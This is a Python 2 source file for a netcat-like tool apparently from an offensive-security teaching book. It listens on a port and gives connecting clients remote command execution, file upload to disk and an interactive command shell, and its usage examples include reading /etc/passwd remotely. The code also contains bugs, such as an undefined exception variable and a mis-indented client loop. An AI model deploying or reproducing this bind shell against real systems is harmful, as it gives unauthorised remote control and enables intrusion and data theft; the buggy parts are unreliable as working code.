import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
	print 'BHP Net Tool'
	print
	print 'Usage: bhp_net.py -t target_host -p port'
	print '-l --listen		- listen on [host]:[port] for incoming connections'
	print '-e --execute=file_to_run	- execute the given file upon receiving a connection'
	print '-c --command		- initialize a command shell'
	print '-u --upload=destination	- upon receiving connection upload a file and write to [destination]'
	print
	print
	print 'Examples: '
	print 'bhp_net.py -t 192.168.0.1 -p 5555 -l -c'
	print 'bhp_net.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe'
	print 'bhp_net.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"'
	print 'echo "ABCDEFGHI" | ./bhp_net.py -t 192.168.0.1 -p 135'
	sys.exit(0)

#input: command to run (string)
#output: command output (string)
#description: creates a subprocess/shell to run the command passed in string format
def run_command(command):
	command = command.rstrip()

	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = 'Failed to execute command.\r\n'

	return output

#input: a client socket (socket object)
#output: 
#description: handler function for a connected client, called upon client connection
def client_handler(client_socket):
	global upload
	global execute
	global command

	#if the server is uploading the received bits into a local file
	if len(upload_destination):
		file_buffer = ''
		
		#load data from client socket into a buffer
		while True:
			data = client_socket.recv(1024)
			
			if not data:
				break
			else:
				file_buffer += data
		
		#write buffer data to file given an upload destination
		try:
			file_descriptor = open(upload_destination, 'wb')
			file_descriptor.write(file_buffer)
			file_descriptor.close()
		except:
			client_socket.send('Failed to save file')

	#execute a command, send output to the client
	if len(execute):
		output = run_command(execute)
		client_socket.send(output)

	#send prompt to client, read in data from client until newline, run command, send data back to client, continue loop
	if command:
		while True:
			client_socket.send('[BHP:#]')
			cmd_buffer = ''
			while '\n' not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			response = run_command(cmd_buffer)

			client_socket.send(response)		

#input:
#output:
#description: loop run by a server, logic to serve client connections
def server_loop():
	global target
	global port

	if not len(target):
		target = '0.0.0.0'

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)

	#wait for new clients to connect, send client socket object to client handler function
	while True:
		client_socket, addr = server.accept()
	
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

#input: data to be sent to server (string)
#output:
#description: logic executed if program is used as a client
def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)
		while True:
			recv_len = 1
			response = ''

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data

				if recv_len < 4096:
					break

		print response,

		buffer = raw_input('')
		buffer += '\n'

		client.send(buffer)

	except Exception as e:
		print '[server]: Exception! ' + str(e)
		client.close()

#input:
#output:
#description: main function, executes other functions based on command line args
def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])
	except getopt.GetoptError as e:
		print str(err)
		usage()

	for o, a in opts:
		if o in ('-h', '--help'):
			usage()
		elif o in ('-l', '--listen'):
			listen = True
		elif o in ('-e', '--execute'):
			execute = a
		elif o in ('-c', '--command'):
			command = True
		elif o in ('-u', '--upload'):
			upload_destination = a
		elif o in ('-t', '--target'):
			target = a
		elif o in ('-p', '--port'):
			port = int(a)
		else:
			assert False, 'Unhandled Option'

	if not listen and len(target) and port > 0:
		buffer = sys.stdin.read()
		client_sender(buffer)
	
	if listen:
		server_loop()

if __name__ == '__main__':
	main()